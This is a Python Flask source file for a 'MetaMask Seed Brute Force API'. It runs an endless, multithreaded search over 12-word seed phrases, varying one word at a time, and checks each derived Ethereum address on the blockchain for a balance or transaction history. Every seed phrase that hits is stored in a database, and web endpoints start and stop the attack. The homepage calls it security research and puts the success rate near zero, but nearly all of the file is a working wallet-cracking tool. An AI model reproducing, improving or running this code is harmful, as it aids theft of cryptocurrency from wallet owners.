import asyncio
import os
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import concurrent.futures

from database import db_manager, SeedMatch
from seed_utils import SeedGenerator

app = Flask(__name__)
CORS(app)

# Global state for attack management
attack_state = {
    "is_running": False,
    "current_cycle": 0,
    "total_attempts": 0,
    "matches_found": 0,
    "current_seed": None,
    "found_addresses": []
}

# Global lock for thread-safe operations
attack_lock = threading.Lock()

def process_position_thread(position: int, words: list, seed_gen: SeedGenerator, detection_method: str, 
                          attack_state: dict, original_word: str, results_queue, progress_callback=None):
    """Process a single word position in a separate thread"""
    position_attempts = 0
    position_matches = []
    
    try:
        # Replace this word with each word from wordlist
        for word_idx, candidate_word in enumerate(seed_gen.wordlist):
            if not attack_state["is_running"]:
                break
            
            # Create a copy of words for this thread
            test_words = words.copy()
            test_words[position] = candidate_word
            test_seed = " ".join(test_words)
            position_attempts += 1
            
            # Update global attempts counter (thread-safe)
            with attack_lock:
                attack_state["total_attempts"] += 1
            
            # Validate seed phrase
            if seed_gen.validate_seed(test_seed):
                try:
                    # Generate wallet address from seed
                    wallet_address = seed_gen.seed_to_address(test_seed)
                    
                    # Use selected detection method
                    has_activity = False
                    activity_value = 0
                    
                    if detection_method == "balance":
                        has_activity = seed_gen.has_balance(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_balance(wallet_address)
                    else:  # transaction count method
                        has_activity = seed_gen.has_transaction_history(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_transaction_count(wallet_address)
                    
                    if has_activity:
                        match_info = {
                            "position": position + 1,
                            "original_word": original_word,
                            "candidate_word": candidate_word,
                            "seed": test_seed,
                            "address": wallet_address,
                            "activity_value": activity_value,
                            "detection_method": detection_method,
                            "attempts": attack_state["total_attempts"]
                        }
                        position_matches.append(match_info)
                        
                except Exception as e:
                    print(f"Error processing seed in position {position + 1}: {e}")
            
            # Progress callback every 50 attempts per position
            if progress_callback and position_attempts % 50 == 0:
                progress_callback(position + 1, position_attempts)
    
    except Exception as e:
        print(f"Error in position {position + 1} thread: {e}")
    
    # Put results in queue
    results_queue.put({
        "position": position,
        "attempts": position_attempts,
        "matches": position_matches
    })

def run_brute_force_attack(max_attempts_per_cycle: int = 2048, detection_method: str = "transactions"):
    """Background task to run the fishing brute force attack"""
    seed_gen = SeedGenerator()
    
    try:
        attack_state["is_running"] = True
        attack_state["current_cycle"] = 0
        attack_state["total_attempts"] = 0
        attack_state["found_addresses"] = []
        
        print(f"Starting infinite brute force attack...")
        print(f"Target: {'Addresses with ETH balance' if detection_method == 'balance' else 'Addresses with transaction history'}")
        print(f"Method: Word variation attack - fix 11 words, iterate through 12th word")
        print(f"Checking: {'ETH balance checking' if detection_method == 'balance' else 'Transaction count checking'}")
        
        cycle = 0
        while attack_state["is_running"]:
            cycle += 1
            attack_state["current_cycle"] = cycle
            
            # Generate a random 12-word base seed
            base_seed = seed_gen.generate_random_seed()
            attack_state["current_seed"] = base_seed
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle}: Testing variations of: {base_seed}")
            
            words = base_seed.split()
            cycle_attempts = 0
            cycle_addresses_with_activity = 0
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🚀 Starting parallel processing of all 12 positions...")
            
            # Create thread-safe queue for results
            import queue
            results_queue = queue.Queue()
            
            # Progress tracking for each position
            position_progress = {i: 0 for i in range(12)}
            progress_lock = threading.Lock()
            
            def progress_callback(position, attempts):
                with progress_lock:
                    position_progress[position - 1] = attempts
                    total_progress = sum(position_progress.values())
                    if total_progress % 500 == 0:
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 Parallel progress: {total_progress} total attempts")
            
            # Start position threads in parallel (12 workers - maximum speed with direct blockchain access)
            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as executor:
                futures = []
                
                for position in range(12):
                    if not attack_state["is_running"]:
                        break
                    
                    original_word = words[position]
                    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🧵 Starting thread for position {position + 1} (original word: '{original_word}')")
                    
                    # Submit thread for this position
                    future = executor.submit(
                        process_position_thread,
                        position, words, seed_gen, detection_method,
                        attack_state, original_word, results_queue,
                        progress_callback
                    )
                    futures.append(future)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ⚡ All 12 position threads started! Processing in parallel with direct blockchain access...")
                
                # Wait for all threads to complete
                concurrent.futures.wait(futures)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ✅ All position threads completed!")
            
            # Collect results from all threads
            all_matches = []
            total_thread_attempts = 0
            
            while not results_queue.empty():
                result = results_queue.get()
                total_thread_attempts += result["attempts"]
                
                # Process any matches found
                for match in result["matches"]:
                    all_matches.append(match)
                    cycle_addresses_with_activity += 1
                    
                    if detection_method == "balance":
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 💰 ADDRESS WITH BALANCE FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original: '{match['original_word']}' → New: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Balance: {match['activity_value']} ETH ✅")
                    else:
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 ADDRESS WITH TRANSACTION HISTORY FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original: '{match['original_word']}' → New: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Transaction Count: {match['activity_value']} ✅")
                    
                    # Store match in database
                    try:
                        # Create async event loop for database operations
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        
                        seed_match = SeedMatch(
                            seed_phrase=match['seed'],
                            address=match['address'],
                            balance=match['activity_value'],
                            timestamp=datetime.utcnow(),
                            attempts_made=match['attempts']
                        )
                        
                        loop.run_until_complete(db_manager.store_successful_match(seed_match))
                        attack_state["matches_found"] += 1
                        attack_state["found_addresses"].append(match['address'])
                        
                        loop.close()
                    except Exception as e:
                        print(f"Error storing match: {e}")
            
            cycle_attempts = total_thread_attempts
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle} completed: {cycle_attempts} attempts, {attack_state['matches_found']} total matches found")
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Total attempts so far: {attack_state['total_attempts']}")
            
            # Small delay between cycles
            time.sleep(0.5)
        
        print(f"Attack stopped. Total attempts: {attack_state['total_attempts']}, Matches found: {attack_state['matches_found']}")
        
    except Exception as e:
        print(f"Error during brute force attack: {e}")
    finally:
        attack_state["is_running"] = False

@app.route('/', methods=['GET'])
def homepage():
    """Homepage with clickable links to all endpoints"""
    base_url = request.host_url.rstrip('/')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MetaMask Seed Brute Force API</title>
        <style>
            body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }}
            h1 {{ color: #2c3e50; }}
            .endpoint {{ background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; }}
            .link {{ display: inline-block; padding: 8px 15px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; margin: 5px; }}
            .link:hover {{ background: #0056b3; }}
            .status {{ background: #28a745; }}
            .attack {{ background: #dc3545; }}
            .test {{ background: #ffc107; color: black; }}
            pre {{ background: #f1f1f1; padding: 10px; border-radius: 4px; overflow-x: auto; }}
        </style>
    </head>
    <body>
        <h1>🚀 MetaMask Seed Brute Force API</h1>
        <p><strong>Flask API for testing partial seed brute-force attacks with direct blockchain access</strong></p>
        
        <div class="endpoint">
            <h3>📊 Status & Health</h3>
            <a href="{base_url}/health" class="link status">Health Check</a>
            <a href="{base_url}/attack/status" class="link status">Attack Status</a>
        </div>
        
        <div class="endpoint">
            <h3>⚡ Attack Control</h3>
            <a href="{base_url}/attack/start" class="link attack">Start Attack (Transactions)</a>
            <a href="{base_url}/attack/start/balance" class="link attack">Start Attack (Balance)</a>
            <a href="{base_url}/attack/stop" class="link attack">Stop Attack</a>
        </div>
        
        <div class="endpoint">
            <h3>🧪 Testing Tools</h3>
            <a href="{base_url}/test/vitalik" class="link test">Test Vitalik's Address</a>
            <a href="{base_url}/test/benchmark" class="link test">Benchmark Methods</a>
            <a href="{base_url}/test/compare/0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045" class="link test">Compare Methods (Vitalik)</a>
        </div>
        
        <div class="endpoint">
            <h3>📚 Documentation</h3>
            <a href="{base_url}/docs" class="link">API Documentation (JSON)</a>
        </div>
        
        <div class="endpoint">
            <h3>🔧 How it Works</h3>
            <p><strong>Algorithm:</strong> Fix 11 words of a seed phrase, iterate through all 2048 possibilities for the 12th word</p>
            <p><strong>Parallelization:</strong> 12 concurrent threads (one per position)</p>
            <p><strong>Detection:</strong> Direct blockchain JSON-RPC calls (no rate limits)</p>
            <p><strong>Target:</strong> Find seeds that have been used (transaction count > 0 or balance > 0)</p>
        </div>
        
        <div class="endpoint">
            <h3>⚠️ Current Status</h3>
            <p><strong>Success Rate:</strong> Extremely low (~0%) for random MetaMask-generated seeds</p>
            <p><strong>Use Case:</strong> Security research and understanding attack vectors</p>
            <p><strong>Performance:</strong> ~24,576 attempts per cycle with 12 parallel threads</p>
        </div>
        
    </body>
    </html>
    '''

@app.route('/docs', methods=['GET'])
def api_documentation():
    """JSON API documentation"""
    return jsonify({
        "name": "MetaMask Seed Brute Force API",
        "description": "Flask API for testing partial seed brute-force attacks",
        "version": "1.0.0",
        "endpoints": {
            "GET /": "Homepage with clickable links",
            "GET /health": "Health check",
            "GET /attack/status": "Get current attack status",
            "GET /attack/start": "Start brute force attack (transactions method)",
            "GET /attack/start/balance": "Start brute force attack (balance method)",
            "GET /attack/stop": "Stop current attack", 
            "GET /test/vitalik": "Test Vitalik's address",
            "GET /test/benchmark": "Benchmark both detection methods",
            "GET /test/compare/<address>": "Compare methods for specific address"
        }
    })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    try:
        return jsonify({
            "status": "healthy",
            "timestamp": datetime.utcnow().isoformat(),
            "message": "Flask app running with direct blockchain access"
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        })

@app.route('/attack/start', methods=['GET'])
def start_attack_transactions():
    """Start a brute force attack using transaction method"""
    if attack_state["is_running"]:
        return jsonify({"error": "Attack already running"}), 400
    
    detection_method = 'transactions'
    max_attempts_per_cycle = 2048
    
    # Start the attack in a background thread
    attack_thread = threading.Thread(
        target=run_brute_force_attack,
        args=(max_attempts_per_cycle, detection_method)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({
        "message": "✅ Brute force attack started with TRANSACTION method",
        "description": "Searching for addresses with transaction history (used wallets)",
        "max_attempts_per_cycle": max_attempts_per_cycle,
        "detection_method": detection_method,
        "method": "12 parallel threads - fix 11 words, iterate through 12th word positions",
        "target": "Addresses with transaction history (human-used wallets)",
        "performance": "~24,576 attempts per cycle with direct blockchain access",
        "note": "Attack runs indefinitely until manually stopped. Check /attack/status for progress."
    })

@app.route('/attack/start/balance', methods=['GET'])
def start_attack_balance():
    """Start a brute force attack using balance method"""
    if attack_state["is_running"]:
        return jsonify({"error": "Attack already running"}), 400
    
    detection_method = 'balance'
    max_attempts_per_cycle = 2048
    
    # Start the attack in a background thread
    attack_thread = threading.Thread(
        target=run_brute_force_attack,
        args=(max_attempts_per_cycle, detection_method)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({
        "message": "✅ Brute force attack started with BALANCE method",
        "description": "Searching for addresses with ETH balance (funded wallets)", 
        "max_attempts_per_cycle": max_attempts_per_cycle,
        "detection_method": detection_method,
        "method": "12 parallel threads - fix 11 words, iterate through 12th word positions",
        "target": "Addresses with ETH balance > 0",
        "performance": "~24,576 attempts per cycle with direct blockchain access",
        "note": "Attack runs indefinitely until manually stopped. Check /attack/status for progress."
    })

@app.route('/attack/stop', methods=['GET'])
def stop_attack():
    """Stop the current attack"""
    if not attack_state["is_running"]:
        return jsonify({"error": "No attack currently running"}), 400
    
    attack_state["is_running"] = False
    return jsonify({
        "message": "🛑 Attack stopped successfully",
        "final_stats": {
            "total_attempts": attack_state["total_attempts"],
            "cycles_completed": attack_state["current_cycle"],
            "matches_found": attack_state["matches_found"]
        }
    })

@app.route('/attack/status', methods=['GET'])
def get_attack_status():
    """Get current attack status"""
    return jsonify({
        "is_running": attack_state["is_running"],
        "current_cycle": attack_state["current_cycle"],
        "total_attempts": attack_state["total_attempts"],
        "matches_found": attack_state["matches_found"],
        "current_seed": attack_state["current_seed"]
    })

@app.route('/test/vitalik', methods=['GET'])
def test_vitalik_address():
    """Test Vitalik's well-known address"""
    address = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
    
    try:
        seed_gen = SeedGenerator()
        import time
        
        # Test transaction count method
        start_time = time.time()
        tx_count = seed_gen.get_transaction_count(address)
        has_transactions = tx_count > 0
        tx_method_time = time.time() - start_time
        
        # Test balance method
        start_time = time.time()
        balance = seed_gen.get_balance(address)
        has_balance = balance > 0
        balance_method_time = time.time() - start_time
        
        return jsonify({
            "name": "Vitalik Buterin's Address",
            "address": address,
            "transaction_method": {
                "transaction_count": tx_count,
                "has_activity": has_transactions,
                "response_time_ms": round(tx_method_time * 1000, 2),
                "result": "✅ VERY ACTIVE" if has_transactions else "❌ INACTIVE"
            },
            "balance_method": {
                "balance_eth": balance,
                "has_balance": has_balance,
                "response_time_ms": round(balance_method_time * 1000, 2),
                "result": f"💰 {balance} ETH" if has_balance else "💸 NO FUNDS"
            },
            "blockchain_connection": "✅ Working" if tx_count is not None else "❌ Failed"
        })
        
    except Exception as e:
        return jsonify({"error": str(e), "status": "❌ Blockchain connection failed"}), 500

@app.route('/test/benchmark', methods=['GET'])
def benchmark_detection_methods():
    """Benchmark both detection methods against known addresses"""
    try:
        # Test addresses with different characteristics
        test_addresses = [
            {
                "name": "Vitalik's Address (high activity)",
                "address": "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
            },
            {
                "name": "Uniswap V2 Router (contract)",
                "address": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
            },
            {
                "name": "Binance Hot Wallet (exchange)",
                "address": "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE"
            }
        ]
        
        seed_gen = SeedGenerator()
        results = []
        
        import time
        
        for addr_info in test_addresses:
            address = addr_info["address"]
            
            # Test transaction count method
            start_time = time.time()
            tx_count = seed_gen.get_transaction_count(address)
            has_transactions = tx_count > 0
            tx_method_time = time.time() - start_time
            
            # Test balance method  
            start_time = time.time()
            balance = seed_gen.get_balance(address)
            has_balance = balance > 0
            balance_method_time = time.time() - start_time
            
            results.append({
                "name": addr_info["name"],
                "address": address,
                "transaction_method": {
                    "count": tx_count,
                    "has_activity": has_transactions,
                    "time_ms": round(tx_method_time * 1000, 2)
                },
                "balance_method": {
                    "balance_eth": balance,
                    "has_balance": has_balance,
                    "time_ms": round(balance_method_time * 1000, 2)
                },
                "winner": "🏃 TX Method" if tx_method_time < balance_method_time else "💰 Balance Method"
            })
        
        # Calculate averages
        avg_tx_time = sum(r["transaction_method"]["time_ms"] for r in results) / len(results)
        avg_balance_time = sum(r["balance_method"]["time_ms"] for r in results) / len(results)
        
        return jsonify({
            "benchmark_results": results,
            "summary": {
                "avg_transaction_method_ms": round(avg_tx_time, 2),
                "avg_balance_method_ms": round(avg_balance_time, 2),
                "overall_winner": "🏃 Transaction Method" if avg_tx_time < avg_balance_time else "💰 Balance Method",
                "speed_advantage_ms": round(abs(avg_balance_time - avg_tx_time), 2),
                "recommendation": "Transaction count method is generally faster" if avg_tx_time < avg_balance_time else "Balance method is generally faster"
            },
            "note": "This benchmark shows performance differences between detection methods"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/test/compare/<address>', methods=['GET'])
def compare_methods_for_address(address):
    """Compare ETH balance check vs transaction count check for a specific address"""
    
    try:
        seed_gen = SeedGenerator()
        
        import time
        
        # Test transaction count method
        start_time = time.time()
        tx_count = seed_gen.get_transaction_count(address)
        has_transactions = tx_count > 0
        tx_method_time = time.time() - start_time
        
        # Test balance method
        start_time = time.time()
        balance = seed_gen.get_balance(address)
        has_balance = balance > 0
        balance_method_time = time.time() - start_time
        
        return jsonify({
            "address": address,
            "transaction_method": {
                "transaction_count": tx_count,
                "has_activity": has_transactions,
                "response_time_ms": round(tx_method_time * 1000, 2),
                "result": "✅ ACTIVE" if has_transactions else "❌ INACTIVE"
            },
            "balance_method": {
                "balance_eth": balance,
                "has_balance": has_balance,
                "response_time_ms": round(balance_method_time * 1000, 2),
                "result": f"💰 {balance} ETH" if has_balance else "💸 NO FUNDS"
            },
            "comparison": {
                "methods_agree": has_transactions == has_balance,
                "winner": "🏃 TX Method" if tx_method_time < balance_method_time else "💰 Balance Method",
                "speed_difference_ms": round(abs(balance_method_time - tx_method_time) * 1000, 2),
                "recommendation": "Use transaction method for speed" if tx_method_time < balance_method_time else "Use balance method for accuracy"
            }
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=False)